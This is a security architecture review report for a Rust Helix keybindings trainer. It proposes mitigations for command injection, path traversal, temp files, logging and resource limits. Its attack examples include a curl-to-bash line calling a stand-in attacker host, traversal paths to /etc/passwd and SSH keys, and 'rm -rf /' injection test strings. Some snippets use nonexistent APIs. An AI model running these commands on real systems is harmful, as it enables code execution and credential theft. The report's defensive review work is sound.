# Security Architecture Review Report
## Helix Keybindings Trainer

**Review Date**: 2025-10-26
**Project Phase**: Foundation (Task 1.1 Complete)
**Reviewer**: Security Engineer
**Scope**: Architecture, Dependencies, Planned Implementation

---

## Executive Summary

This security review evaluates the Helix Keybindings Trainer project from a defensive security perspective. The project is in early initialization phase with minimal code implementation. This review identifies potential security vulnerabilities in the planned architecture and provides actionable recommendations to build security controls from the ground up.

**Overall Security Posture**: LOW RISK (current implementation)
**Projected Risk**: MEDIUM-HIGH (planned PTY integration and subprocess management)

**Critical Findings**: 2
**High Findings**: 4
**Medium Findings**: 6
**Low Findings**: 5

---

## 1. Security Findings

### CRITICAL SEVERITY

#### C-01: Command Injection Risk in PTY Controller
**Category**: Code Execution
**Status**: Not Yet Implemented
**CVSS Score**: 9.8 (Critical)

**Description**:
The planned PTY controller (`src/helix/pty_controller.rs`) will spawn Helix subprocess with user-controlled parameters. Without proper input sanitization, attackers could inject malicious commands through:
- Scenario file paths
- Initial file content
- Command sequences

**Attack Scenario**:
```toml
# Malicious scenario file
[scenarios.setup]
file_content = """$(curl http://attacker.com/malware.sh | bash)"""
cursor_position = [0, 0]
```

**Impact**:
- Arbitrary code execution on host system
- Privilege escalation if running with elevated permissions
- Data exfiltration from user's system

**Recommendation**:
1. **Input Validation**:
   ```rust
   fn validate_file_path(path: &Path) -> Result<(), SecurityError> {
       // Whitelist allowed directories
       let allowed_base = std::env::temp_dir();
       let canonical = path.canonicalize()?;

       if !canonical.starts_with(&allowed_base) {
           return Err(SecurityError::PathTraversal);
       }

       // Check for suspicious patterns
       let path_str = path.to_string_lossy();
       if path_str.contains("..") || path_str.contains('$') {
           return Err(SecurityError::SuspiciousPath);
       }

       Ok(())
   }
   ```

2. **Sandboxed Execution**: Use process sandboxing
   ```rust
   use std::os::unix::process::CommandExt;

   fn spawn_helix_sandboxed(file_path: &Path) -> Result<Child> {
       Command::new("helix")
           .arg(file_path)
           .env_clear()  // Clear all environment variables
           .env("PATH", "/usr/local/bin:/usr/bin")  // Minimal PATH
           .stdin(Stdio::piped())
           .stdout(Stdio::piped())
           .stderr(Stdio::piped())
           .spawn()
   }
   ```

3. **Argument Escaping**: Never pass unsanitized strings to shell
   ```rust
   // WRONG - vulnerable to injection
   Command::new("sh").arg("-c").arg(format!("helix {}", user_input));

   // CORRECT - direct execution with validated args
   Command::new("helix").arg(validated_path);
   ```

---

#### C-02: Unsafe Deserialization of TOML Scenarios
**Category**: Deserialization Vulnerability
**Status**: Not Yet Implemented
**CVSS Score**: 8.6 (High)

**Description**:
The scenario loading system will deserialize untrusted TOML files. Without validation, malicious scenario files could:
- Cause denial of service (memory exhaustion)
- Trigger logic bugs through malformed data
- Exploit parser vulnerabilities

**Attack Scenario**:
```toml
# Malicious scenario with resource exhaustion
[[scenarios]]
id = "malicious"
name = "Attack"
# Extremely large content to exhaust memory
setup.file_content = "A" * 1000000000
# Deeply nested structures
[[scenarios.alternatives]]
[[scenarios.alternatives.alternatives]]
[[scenarios.alternatives.alternatives.alternatives]]
# ... (repeat 10000 times)
```

**Impact**:
- Application crash (DoS)
- Memory exhaustion
- Potential parser vulnerabilities

**Recommendation**:
1. **Size Limits and Validation**:
   ```rust
   use std::fs;

   const MAX_SCENARIO_FILE_SIZE: u64 = 10 * 1024 * 1024; // 10MB
   const MAX_SCENARIOS_PER_FILE: usize = 100;
   const MAX_FILE_CONTENT_LENGTH: usize = 100_000;
   const MAX_HINTS: usize = 10;
   const MAX_ALTERNATIVES: usize = 20;

   pub fn load_scenarios(path: &Path) -> anyhow::Result<Vec<Scenario>> {
       // Check file size before reading
       let metadata = fs::metadata(path)?;
       if metadata.len() > MAX_SCENARIO_FILE_SIZE {
           return Err(SecurityError::FileTooLarge.into());
       }

       // Read file content
       let content = fs::read_to_string(path)?;

       // Parse with error handling
       let scenarios: Vec<Scenario> = toml::from_str(&content)
           .map_err(|e| SecurityError::InvalidToml(e.to_string()))?;

       // Validate scenario count
       if scenarios.len() > MAX_SCENARIOS_PER_FILE {
           return Err(SecurityError::TooManyScenarios.into());
       }

       // Validate each scenario
       for scenario in &scenarios {
           validate_scenario(scenario)?;
       }

       Ok(scenarios)
   }

   fn validate_scenario(scenario: &Scenario) -> Result<(), SecurityError> {
       // Validate ID (alphanumeric only)
       if !scenario.id.chars().all(|c| c.is_alphanumeric() || c == '_') {
           return Err(SecurityError::InvalidScenarioId);
       }

       // Limit content size
       if scenario.setup.file_content.len() > MAX_FILE_CONTENT_LENGTH {
           return Err(SecurityError::ContentTooLarge);
       }

       // Validate cursor position
       if scenario.setup.cursor_position.0 > 10000
           || scenario.setup.cursor_position.1 > 10000 {
           return Err(SecurityError::InvalidCursorPosition);
       }

       // Limit hints
       if scenario.hints.len() > MAX_HINTS {
           return Err(SecurityError::TooManyHints);
       }

       // Limit alternatives
       if scenario.alternatives.len() > MAX_ALTERNATIVES {
           return Err(SecurityError::TooManyAlternatives);
       }

       Ok(())
   }
   ```

2. **Schema Validation**: Define strict schema
   ```rust
   #[derive(Deserialize, Debug, Clone)]
   #[serde(deny_unknown_fields)]  // Reject unknown fields
   pub struct Scenario {
       #[serde(deserialize_with = "validate_id")]
       pub id: String,

       #[serde(deserialize_with = "validate_string_length")]
       pub name: String,

       pub setup: Setup,
       pub target: TargetState,
       pub solution: Solution,

       #[serde(default)]
       pub alternatives: Vec<AlternativeSolution>,

       #[serde(default)]
       pub hints: Vec<String>,

       pub scoring: ScoringConfig,
   }

   fn validate_id<'de, D>(deserializer: D) -> Result<String, D::Error>
   where
       D: serde::Deserializer<'de>,
   {
       let s = String::deserialize(deserializer)?;
       if s.len() > 64 || !s.chars().all(|c| c.is_alphanumeric() || c == '_') {
           return Err(serde::de::Error::custom("Invalid ID format"));
       }
       Ok(s)
   }
   ```

3. **Sandboxed Parsing**: Consider using separate process
   ```rust
   // For untrusted scenario sources, parse in isolated process
   use std::process::Command;

   fn parse_untrusted_scenario(path: &Path) -> Result<Vec<Scenario>> {
       // Spawn validator process with timeout
       let output = Command::new("scenario-validator")
           .arg(path)
           .timeout(Duration::from_secs(5))
           .output()?;

       // Process result in main application
       serde_json::from_slice(&output.stdout)
   }
   ```

---

### HIGH SEVERITY

#### H-01: Path Traversal in Scenario File Loading
**Category**: Path Traversal
**Status**: Not Yet Implemented
**CVSS Score**: 7.5 (High)

**Description**:
The application will load scenario files from user-specified paths. Without validation, attackers could read arbitrary files on the system.

**Attack Scenario**:
```bash
# User provides malicious path
helix-trainer --scenarios ../../../etc/passwd
helix-trainer --scenarios /home/user/.ssh/id_rsa
```

**Recommendation**:
```rust
use std::path::{Path, PathBuf};

pub struct ScenarioLoader {
    allowed_base_paths: Vec<PathBuf>,
}

impl ScenarioLoader {
    pub fn new() -> Self {
        Self {
            allowed_base_paths: vec![
                PathBuf::from("./scenarios"),
                PathBuf::from("/usr/share/helix-trainer/scenarios"),
            ],
        }
    }

    pub fn load(&self, path: &Path) -> Result<Vec<Scenario>> {
        // Canonicalize path to resolve symlinks and .. components
        let canonical = path.canonicalize()
            .map_err(|_| SecurityError::InvalidPath)?;

        // Check if path is within allowed directories
        let is_allowed = self.allowed_base_paths.iter().any(|base| {
            canonical.starts_with(base)
        });

        if !is_allowed {
            return Err(SecurityError::PathTraversal.into());
        }

        // Additional checks
        if self.is_suspicious_path(&canonical) {
            return Err(SecurityError::SuspiciousPath.into());
        }

        self.load_validated(canonical)
    }

    fn is_suspicious_path(&self, path: &Path) -> bool {
        let path_str = path.to_string_lossy();

        // Check for suspicious patterns
        path_str.contains("..")
            || path_str.contains("//")
            || path_str.contains("/etc/")
            || path_str.contains("/root/")
            || path_str.contains("/.ssh/")
    }
}
```

---

#### H-02: Insecure Temporary File Handling
**Category**: Information Disclosure, Race Condition
**Status**: Not Yet Implemented
**CVSS Score**: 7.1 (High)

**Description**:
The application will create temporary files for Helix to edit. Insecure temporary file creation can lead to:
- Information disclosure (world-readable files)
- Symlink attacks (race conditions)
- Temporary file injection

**Recommendation**:
```rust
use tempfile::{NamedTempFile, TempDir};
use std::os::unix::fs::PermissionsExt;

pub struct SecureTempFileManager {
    temp_dir: TempDir,
}

impl SecureTempFileManager {
    pub fn new() -> Result<Self> {
        // Create temporary directory with restricted permissions
        let temp_dir = TempDir::new()?;

        // Set directory permissions to 0700 (owner only)
        #[cfg(unix)]
        {
            let metadata = temp_dir.path().metadata()?;
            let mut permissions = metadata.permissions();
            permissions.set_mode(0o700);
            std::fs::set_permissions(temp_dir.path(), permissions)?;
        }

        Ok(Self { temp_dir })
    }

    pub fn create_scenario_file(&self, content: &str) -> Result<PathBuf> {
        // Create temp file with secure permissions
        let mut temp_file = NamedTempFile::new_in(self.temp_dir.path())?;

        // Write content
        temp_file.write_all(content.as_bytes())?;

        // Set file permissions to 0600 (owner read/write only)
        #[cfg(unix)]
        {
            let metadata = temp_file.as_file().metadata()?;
            let mut permissions = metadata.permissions();
            permissions.set_mode(0o600);
            temp_file.as_file().set_permissions(permissions)?;
        }

        // Persist temp file and return path
        let (_, path) = temp_file.keep()?;
        Ok(path)
    }

    pub fn cleanup(&mut self) -> Result<()> {
        // Explicitly close and delete temp directory
        self.temp_dir.close()?;
        Ok(())
    }
}

// Add to Cargo.toml:
// [dependencies]
// tempfile = "3.8"
```

**Additional Security Measures**:
```rust
// Sanitize file content before writing
fn sanitize_content(content: &str) -> Result<String> {
    // Check for null bytes
    if content.contains('\0') {
        return Err(SecurityError::InvalidContent);
    }

    // Check for excessive size
    if content.len() > MAX_FILE_CONTENT_LENGTH {
        return Err(SecurityError::ContentTooLarge);
    }

    // Validate UTF-8
    String::from_utf8(content.as_bytes().to_vec())
        .map_err(|_| SecurityError::InvalidEncoding)
}
```

---

#### H-03: Subprocess Management Security
**Category**: Process Control
**Status**: Not Yet Implemented
**CVSS Score**: 7.3 (High)

**Description**:
The PTY controller will manage Helix subprocess lifecycle. Improper process management can lead to:
- Resource exhaustion (zombie processes)
- Privilege escalation
- Information leakage through process environment

**Recommendation**:
```rust
use std::process::{Child, Command, Stdio};
use std::time::Duration;

pub struct SecureProcessManager {
    child: Option<Child>,
    timeout: Duration,
}

impl SecureProcessManager {
    pub fn spawn_helix(&mut self, file_path: &Path) -> Result<()> {
        // Ensure no existing process
        if self.child.is_some() {
            self.terminate()?;
        }

        // Spawn with minimal privileges
        let child = Command::new("helix")
            .arg(file_path)
            // Security: Clear environment to prevent injection
            .env_clear()
            // Set minimal safe environment
            .env("PATH", "/usr/local/bin:/usr/bin:/bin")
            .env("TERM", "xterm-256color")
            .env("HOME", std::env::temp_dir())
            // Redirect all streams
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            // Drop privileges if running as root
            .uid(self.get_safe_uid())
            .gid(self.get_safe_gid())
            .spawn()
            .map_err(|e| SecurityError::ProcessSpawnFailed(e.to_string()))?;

        self.child = Some(child);
        Ok(())
    }

    pub fn terminate(&mut self) -> Result<()> {
        if let Some(mut child) = self.child.take() {
            // Try graceful shutdown first
            if let Err(e) = child.kill() {
                tracing::warn!("Failed to kill process: {}", e);
            }

            // Wait for process to exit with timeout
            match child.wait_timeout(self.timeout) {
                Ok(Some(status)) => {
                    tracing::info!("Process exited with status: {}", status);
                }
                Ok(None) => {
                    // Force kill if timeout
                    tracing::warn!("Process did not exit in time, force killing");
                    let _ = nix::sys::signal::kill(
                        nix::unistd::Pid::from_raw(child.id() as i32),
                        nix::sys::signal::Signal::SIGKILL
                    );
                }
                Err(e) => {
                    tracing::error!("Error waiting for process: {}", e);
                }
            }
        }
        Ok(())
    }

    fn get_safe_uid(&self) -> u32 {
        // Never run as root
        let uid = nix::unistd::getuid();
        if uid.is_root() {
            // Drop to nobody user
            65534
        } else {
            uid.as_raw()
        }
    }

    fn get_safe_gid(&self) -> u32 {
        let gid = nix::unistd::getgid();
        if gid.as_raw() == 0 {
            65534  // nogroup
        } else {
            gid.as_raw()
        }
    }
}

impl Drop for SecureProcessManager {
    fn drop(&mut self) {
        // Ensure cleanup on drop
        let _ = self.terminate();
    }
}

// Add to Cargo.toml:
// [dependencies]
// nix = { version = "0.27", features = ["process", "signal"] }
// wait-timeout = "0.2"
```

---

#### H-04: Logging Information Disclosure
**Category**: Information Disclosure
**Status**: Partially Implemented
**CVSS Score**: 6.5 (Medium)

**Description**:
The application uses `tracing` for logging. Without proper configuration, sensitive information could be logged:
- File paths containing usernames
- Scenario content (potentially sensitive)
- System information
- PTY communication

**Recommendation**:
```rust
use tracing_subscriber::{filter::LevelFilter, fmt, EnvFilter, prelude::*};

pub fn init_secure_logging() -> Result<()> {
    // Create filter that excludes sensitive modules at high log levels
    let filter = EnvFilter::builder()
        .with_default_directive(LevelFilter::INFO.into())
        .from_env_lossy()
        // Never log PTY communication at debug level in production
        .add_directive("helix_trainer::helix::pty_controller=warn".parse()?)
        .add_directive("helix_trainer::config::scenarios=info".parse()?);

    // Configure formatter to sanitize output
    let fmt_layer = fmt::layer()
        .with_target(true)
        .with_thread_ids(false)  // Don't leak thread info
        .with_thread_names(false)
        .with_file(false)  // Don't leak file paths
        .with_line_number(false);

    tracing_subscriber::registry()
        .with(filter)
        .with(fmt_layer)
        .init();

    Ok(())
}

// Sanitize sensitive data in logs
fn sanitize_path_for_logging(path: &Path) -> String {
    // Only show filename, not full path
    path.file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("[redacted]")
        .to_string()
}

// Usage:
tracing::info!(
    scenario_id = %scenario.id,
    file = %sanitize_path_for_logging(&file_path),
    "Loading scenario"
);
```

**Production Logging Guidelines**:
```rust
// Create custom error type that doesn't leak sensitive info
#[derive(Debug, thiserror::Error)]
pub enum PublicError {
    #[error("Failed to load scenario")]
    ScenarioLoadFailed,

    #[error("Invalid scenario format")]
    InvalidScenario,

    #[error("Process error occurred")]
    ProcessError,
}

impl From<SecurityError> for PublicError {
    fn from(err: SecurityError) -> Self {
        // Log full error internally
        tracing::error!("Security error: {:?}", err);

        // Return sanitized error to user
        match err {
            SecurityError::PathTraversal |
            SecurityError::InvalidPath => PublicError::ScenarioLoadFailed,
            SecurityError::InvalidToml(_) => PublicError::InvalidScenario,
            _ => PublicError::ProcessError,
        }
    }
}
```

---

### MEDIUM SEVERITY

#### M-01: Input Validation on User Commands
**Category**: Input Validation
**Status**: Not Yet Implemented
**CVSS Score**: 5.3 (Medium)

**Description**:
The command tracker will capture user keyboard input. Without validation, malicious input sequences could cause application crashes or unexpected behavior.

**Recommendation**:
```rust
use crossterm::event::{Event, KeyCode, KeyEvent, KeyModifiers};

const MAX_COMMAND_SEQUENCE_LENGTH: usize = 100;
const COMMAND_TIMEOUT: Duration = Duration::from_secs(30);

pub struct CommandTracker {
    commands: Vec<KeyEvent>,
    last_command_time: Instant,
}

impl CommandTracker {
    pub fn record_command(&mut self, event: KeyEvent) -> Result<()> {
        // Check timeout - reset if too long since last command
        if self.last_command_time.elapsed() > COMMAND_TIMEOUT {
            self.commands.clear();
        }

        // Limit command sequence length to prevent memory exhaustion
        if self.commands.len() >= MAX_COMMAND_SEQUENCE_LENGTH {
            return Err(SecurityError::CommandSequenceTooLong.into());
        }

        // Validate command is printable or known control key
        if !self.is_valid_command(&event) {
            tracing::warn!("Invalid command received: {:?}", event);
            return Err(SecurityError::InvalidCommand.into());
        }

        self.commands.push(event);
        self.last_command_time = Instant::now();

        Ok(())
    }

    fn is_valid_command(&self, event: &KeyEvent) -> bool {
        match event.code {
            KeyCode::Char(c) => {
                // Allow printable ASCII and common Helix commands
                c.is_ascii_graphic() || c.is_ascii_whitespace()
            }
            KeyCode::Enter | KeyCode::Tab | KeyCode::Backspace |
            KeyCode::Delete | KeyCode::Esc => true,
            KeyCode::Up | KeyCode::Down | KeyCode::Left | KeyCode::Right => true,
            KeyCode::Home | KeyCode::End => true,
            KeyCode::PageUp | KeyCode::PageDown => true,
            KeyCode::F(n) if n <= 12 => true,
            _ => false,
        }
    }

    pub fn clear(&mut self) {
        self.commands.clear();
        self.last_command_time = Instant::now();
    }
}
```

---

#### M-02: Denial of Service via Resource Exhaustion
**Category**: Availability
**Status**: Not Yet Implemented
**CVSS Score**: 5.3 (Medium)

**Description**:
Multiple attack vectors could cause resource exhaustion:
- Loading many large scenario files simultaneously
- Creating excessive temporary files
- Spawning multiple Helix processes
- Long-running game sessions

**Recommendation**:
```rust
use std::sync::{Arc, Mutex};

pub struct ResourceLimiter {
    active_sessions: Arc<Mutex<usize>>,
    max_sessions: usize,
    temp_file_count: Arc<Mutex<usize>>,
    max_temp_files: usize,
}

impl ResourceLimiter {
    pub fn new() -> Self {
        Self {
            active_sessions: Arc::new(Mutex::new(0)),
            max_sessions: 10,
            temp_file_count: Arc::new(Mutex::new(0)),
            max_temp_files: 100,
        }
    }

    pub fn acquire_session(&self) -> Result<SessionGuard> {
        let mut count = self.active_sessions.lock().unwrap();
        if *count >= self.max_sessions {
            return Err(SecurityError::TooManySessions.into());
        }
        *count += 1;

        Ok(SessionGuard {
            limiter: self.active_sessions.clone(),
        })
    }

    pub fn acquire_temp_file(&self) -> Result<TempFileGuard> {
        let mut count = self.temp_file_count.lock().unwrap();
        if *count >= self.max_temp_files {
            return Err(SecurityError::TooManyTempFiles.into());
        }
        *count += 1;

        Ok(TempFileGuard {
            limiter: self.temp_file_count.clone(),
        })
    }
}

pub struct SessionGuard {
    limiter: Arc<Mutex<usize>>,
}

impl Drop for SessionGuard {
    fn drop(&mut self) {
        let mut count = self.limiter.lock().unwrap();
        *count = count.saturating_sub(1);
    }
}

// Session timeout
const SESSION_TIMEOUT: Duration = Duration::from_secs(3600); // 1 hour

impl GameSession {
    pub fn check_timeout(&self) -> Result<()> {
        if self.started_at.elapsed() > SESSION_TIMEOUT {
            return Err(SecurityError::SessionTimeout.into());
        }
        Ok(())
    }
}
```

---

#### M-03: Integer Overflow in Scoring System
**Category**: Logic Error
**Status**: Not Yet Implemented
**CVSS Score**: 4.3 (Medium)

**Description**:
The scoring system performs mathematical operations that could overflow with extreme inputs.

**Recommendation**:
```rust
impl Scorer {
    pub fn calculate_score(
        optimal_count: usize,
        actual_count: usize,
        max_points: u32,
    ) -> Result<u32> {
        // Validate inputs
        if optimal_count == 0 {
            return Err(SecurityError::InvalidScoringConfig.into());
        }

        if actual_count > 1_000_000 {
            return Err(SecurityError::TooManyActions.into());
        }

        // Use checked arithmetic to prevent overflow
        let score = if actual_count <= optimal_count {
            max_points
        } else {
            // Safe division with overflow check
            let numerator = (max_points as u64)
                .checked_mul(optimal_count as u64)
                .ok_or(SecurityError::ScoreOverflow)?;

            let result = numerator
                .checked_div(actual_count as u64)
                .ok_or(SecurityError::ScoreOverflow)?;

            // Clamp to u32 range
            result.min(u32::MAX as u64) as u32
        };

        Ok(score)
    }

    pub fn calculate_time_bonus(
        elapsed: Duration,
        time_limit: Duration,
        max_bonus: u32,
    ) -> Result<u32> {
        if elapsed >= time_limit {
            return Ok(0);
        }

        let remaining = time_limit
            .checked_sub(elapsed)
            .ok_or(SecurityError::InvalidDuration)?;

        let bonus = (max_bonus as u64)
            .checked_mul(remaining.as_secs())
            .and_then(|n| n.checked_div(time_limit.as_secs()))
            .ok_or(SecurityError::ScoreOverflow)?;

        Ok(bonus.min(max_bonus as u64) as u32)
    }
}
```

---

#### M-04: Race Conditions in Async Operations
**Category**: Concurrency
**Status**: Not Yet Implemented
**CVSS Score**: 4.7 (Medium)

**Description**:
The application uses Tokio async runtime. Race conditions could occur when:
- Multiple tasks access shared state
- PTY communication overlaps with state checks
- Scenario loading happens during active sessions

**Recommendation**:
```rust
use tokio::sync::{RwLock, Mutex as AsyncMutex};

pub struct SafeGameState {
    current_scenario: Arc<RwLock<Option<Scenario>>>,
    editor_state: Arc<RwLock<EditorState>>,
    score: Arc<AsyncMutex<u32>>,
}

impl SafeGameState {
    pub async fn update_state(&self, new_state: EditorState) -> Result<()> {
        // Acquire write lock
        let mut state = self.editor_state.write().await;
        *state = new_state;
        Ok(())
    }

    pub async fn check_completion(&self) -> Result<bool> {
        // Acquire read locks in consistent order to prevent deadlocks
        let scenario = self.current_scenario.read().await;
        let state = self.editor_state.read().await;

        if let Some(ref scenario) = *scenario {
            Ok(scenario.target.matches(&state))
        } else {
            Ok(false)
        }
    }
}

// Use oneshot channels for process communication
use tokio::sync::oneshot;

pub async fn spawn_helix_async(
    file_path: PathBuf
) -> Result<oneshot::Receiver<ProcessResult>> {
    let (tx, rx) = oneshot::channel();

    tokio::spawn(async move {
        let result = spawn_helix_process(&file_path).await;
        let _ = tx.send(result);
    });

    Ok(rx)
}
```

---

#### M-05: Terminal Escape Sequence Injection
**Category**: Terminal Security
**Status**: Not Yet Implemented
**CVSS Score**: 5.0 (Medium)

**Description**:
When displaying scenario content or user input in the terminal, malicious escape sequences could:
- Change terminal colors/settings
- Clear screen unexpectedly
- Execute terminal-specific commands

**Recommendation**:
```rust
pub fn sanitize_terminal_output(input: &str) -> String {
    input
        .chars()
        .filter(|c| {
            // Allow printable characters and basic whitespace
            c.is_ascii_graphic()
                || matches!(c, ' ' | '\n' | '\t')
        })
        .collect()
}

pub fn display_scenario_content(content: &str) -> String {
    // Remove ANSI escape sequences
    let ansi_regex = regex::Regex::new(r"\x1b\[[0-9;]*[a-zA-Z]").unwrap();
    let cleaned = ansi_regex.replace_all(content, "");

    // Limit length
    if cleaned.len() > 10000 {
        format!("{}...[truncated]", &cleaned[..10000])
    } else {
        cleaned.to_string()
    }
}

// Add to Cargo.toml:
// [dependencies]
// regex = "1.10"
```

---

#### M-06: Insufficient Error Handling
**Category**: Information Disclosure
**Status**: Partially Implemented
**CVSS Score**: 4.3 (Medium)

**Description**:
The current error handling uses `anyhow::Result` which may expose internal details in error messages.

**Recommendation**:
```rust
use thiserror::Error;

#[derive(Error, Debug)]
pub enum SecurityError {
    #[error("Access denied: path outside allowed directory")]
    PathTraversal,

    #[error("Invalid file path")]
    InvalidPath,

    #[error("Scenario file too large")]
    FileTooLarge,

    #[error("Invalid TOML format: {0}")]
    InvalidToml(String),

    #[error("Too many scenarios in file")]
    TooManyScenarios,

    #[error("Invalid scenario ID")]
    InvalidScenarioId,

    #[error("Process spawn failed")]
    ProcessSpawnFailed(String),

    #[error("Session timeout")]
    SessionTimeout,
}

#[derive(Error, Debug)]
pub enum UserError {
    #[error("Failed to load scenario file. Please check the file path and format.")]
    ScenarioLoadError,

    #[error("The scenario file is too large or complex. Please use a smaller file.")]
    ScenarioTooComplex,

    #[error("Failed to start editor. Please ensure Helix is installed.")]
    EditorStartFailed,
}

// Convert internal errors to user-friendly errors
impl From<SecurityError> for UserError {
    fn from(err: SecurityError) -> Self {
        tracing::error!("Security error occurred: {:?}", err);

        match err {
            SecurityError::PathTraversal | SecurityError::InvalidPath => {
                UserError::ScenarioLoadError
            }
            SecurityError::FileTooLarge | SecurityError::TooManyScenarios => {
                UserError::ScenarioTooComplex
            }
            SecurityError::ProcessSpawnFailed(_) => {
                UserError::EditorStartFailed
            }
            _ => UserError::ScenarioLoadError,
        }
    }
}
```

---

### LOW SEVERITY

#### L-01: Missing Dependency Version Pinning
**Category**: Supply Chain
**Status**: Current
**CVSS Score**: 3.7 (Low)

**Description**:
Cargo.toml uses caret version requirements (^) which allow minor version updates. This could introduce breaking changes or security vulnerabilities.

**Recommendation**:
```toml
# Current (risky)
[dependencies]
ratatui = "0.28"
crossterm = "0.28"

# Recommended (pinned)
[dependencies]
ratatui = "=0.28.1"  # Exact version
crossterm = "=0.28.1"

# Or use tilde for patch updates only
[dependencies]
ratatui = "~0.28.1"  # Allows 0.28.x but not 0.29
crossterm = "~0.28.1"
```

**Additional Measures**:
```bash
# Add Cargo.lock to version control (already done)
git add Cargo.lock

# Regular dependency audits
cargo install cargo-audit
cargo audit

# Update dependencies cautiously
cargo update --dry-run
cargo update --package <specific-package>
```

---

#### L-02: Missing Security Headers in Documentation
**Category**: Documentation
**Status**: Current
**CVSS Score**: 2.0 (Low)

**Description**:
Project documentation lacks security guidelines for contributors and users.

**Recommendation**:
Create SECURITY.md file:

```markdown
# Security Policy

## Supported Versions

| Version | Supported          |
| ------- | ------------------ |
| 0.1.x   | :white_check_mark: |

## Reporting a Vulnerability

Please report security vulnerabilities to security@helix-trainer.example.com

DO NOT open public GitHub issues for security vulnerabilities.

## Security Considerations

### For Users

1. Only load scenario files from trusted sources
2. Review scenario content before running
3. Run with minimal privileges (never as root)
4. Keep Helix editor updated

### For Contributors

1. Never commit secrets or credentials
2. Validate all user input
3. Use safe Rust practices (avoid unwrap, use checked arithmetic)
4. Add security tests for new features
5. Follow principle of least privilege

## Known Security Limitations

1. PTY integration requires careful review
2. Scenario files are trusted by default
3. No current sandboxing of Helix process
```

---

#### L-03: Lack of Security Tests
**Category**: Testing
**Status**: Not Yet Implemented
**CVSS Score**: 3.0 (Low)

**Description**:
No security-focused tests are planned or implemented.

**Recommendation**:
```rust
#[cfg(test)]
mod security_tests {
    use super::*;

    #[test]
    fn test_path_traversal_prevention() {
        let loader = ScenarioLoader::new();

        // Should reject path traversal attempts
        assert!(loader.load(Path::new("../../etc/passwd")).is_err());
        assert!(loader.load(Path::new("/etc/passwd")).is_err());
        assert!(loader.load(Path::new("scenarios/../../../secret")).is_err());
    }

    #[test]
    fn test_scenario_size_limits() {
        let huge_content = "A".repeat(1_000_000_000);
        let scenario = create_test_scenario_with_content(&huge_content);

        assert!(validate_scenario(&scenario).is_err());
    }

    #[test]
    fn test_command_injection_prevention() {
        let malicious_paths = vec![
            "file.txt; rm -rf /",
            "file.txt && malicious_command",
            "$(evil_command)",
            "`backdoor`",
        ];

        for path in malicious_paths {
            assert!(validate_file_path(Path::new(path)).is_err());
        }
    }

    #[test]
    fn test_integer_overflow_in_scoring() {
        // Should not panic on extreme values
        let result = Scorer::calculate_score(1, usize::MAX, u32::MAX);
        assert!(result.is_ok() || result.is_err());  // Should handle gracefully
    }

    #[test]
    fn test_malformed_toml_handling() {
        let malformed = r#"
        [[scenarios]]
        id = "test"
        # Missing required fields
        "#;

        let result = toml::from_str::<Vec<Scenario>>(malformed);
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_resource_cleanup() {
        let manager = SecureProcessManager::new();
        // Process should be cleaned up on drop
        drop(manager);

        // No zombie processes should remain
        // Check with `ps` or similar
    }
}
```

---

#### L-04: No Rate Limiting
**Category**: Availability
**Status**: Not Yet Implemented
**CVSS Score**: 3.3 (Low)

**Description**:
No protection against rapid scenario loading or game session creation.

**Recommendation**:
```rust
use std::time::{Duration, Instant};

pub struct RateLimiter {
    last_action: Instant,
    min_interval: Duration,
}

impl RateLimiter {
    pub fn new(min_interval: Duration) -> Self {
        Self {
            last_action: Instant::now(),
            min_interval,
        }
    }

    pub fn check_rate_limit(&mut self) -> Result<()> {
        let elapsed = self.last_action.elapsed();

        if elapsed < self.min_interval {
            let remaining = self.min_interval - elapsed;
            return Err(SecurityError::RateLimitExceeded {
                retry_after: remaining,
            }.into());
        }

        self.last_action = Instant::now();
        Ok(())
    }
}

// Usage in scenario loader
pub struct ScenarioLoader {
    rate_limiter: RateLimiter,
}

impl ScenarioLoader {
    pub fn load(&mut self, path: &Path) -> Result<Vec<Scenario>> {
        // Check rate limit
        self.rate_limiter.check_rate_limit()?;

        // Proceed with loading
        self.load_internal(path)
    }
}
```

---

#### L-05: Insufficient Debug Mode Protection
**Category**: Information Disclosure
**Status**: Current
**CVSS Score**: 2.3 (Low)

**Description**:
Debug builds may leak sensitive information if accidentally deployed.

**Recommendation**:
```rust
// In main.rs
fn main() -> Result<()> {
    // Warn if running debug build
    #[cfg(debug_assertions)]
    {
        eprintln!("WARNING: Running debug build. Not for production use!");
        eprintln!("Build with: cargo build --release");
    }

    // Disable certain features in debug
    #[cfg(all(debug_assertions, not(test)))]
    {
        // Limit debug logging
        std::env::set_var("RUST_LOG", "info");
    }

    run_application()
}

// Add build warnings
// In build.rs:
fn main() {
    if !cfg!(debug_assertions) {
        println!("cargo:rustc-env=BUILD_TYPE=release");
    } else {
        println!("cargo:rustc-env=BUILD_TYPE=debug");
        println!("cargo:warning=Building in debug mode");
    }
}
```

---

## 2. Dependency Security Analysis

### Current Dependencies

| Dependency | Version | Status | Notes |
|------------|---------|--------|-------|
| ratatui | 0.28.1 | ✅ SAFE | Actively maintained, no known vulnerabilities |
| crossterm | 0.28.1 | ✅ SAFE | Actively maintained, no known vulnerabilities |
| tokio | 1.48.0 | ✅ SAFE | Well-audited, security-focused project |
| serde | 1.0.228 | ✅ SAFE | Widely used, well-maintained |
| toml | 0.8.23 | ⚠️ REVIEW | Consider limits on file size/complexity |
| tracing | 0.1.41 | ✅ SAFE | No known issues |
| tracing-subscriber | 0.3.20 | ✅ SAFE | No known issues |
| anyhow | 1.0.100 | ✅ SAFE | No known issues |
| thiserror | 1.0.69 | ✅ SAFE | No known issues |

### Missing Security Dependencies

**Recommended Additions**:

```toml
[dependencies]
# Existing dependencies...

# Security enhancements
tempfile = "3.8"           # Secure temporary file handling
nix = { version = "0.27", features = ["process", "signal"] }  # Unix process control
secrecy = "0.8"            # Protect sensitive data in memory
regex = "1.10"             # Input sanitization
wait-timeout = "0.2"       # Process timeout handling

[dev-dependencies]
# Existing dev dependencies...

# Security testing
proptest = "1.4"           # Property-based testing for edge cases
```

### Supply Chain Security

**Recommendations**:

1. **Dependency Auditing**:
```bash
# Install cargo-audit
cargo install cargo-audit

# Run regular audits
cargo audit

# Add to CI/CD pipeline
cargo audit --deny warnings
```

2. **Dependency Review**:
```bash
# Check dependency tree for suspicious packages
cargo tree

# Review licenses
cargo install cargo-license
cargo license
```

3. **Automated Updates**:
```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "cargo"
    directory: "/"
    schedule:
      interval: "weekly"
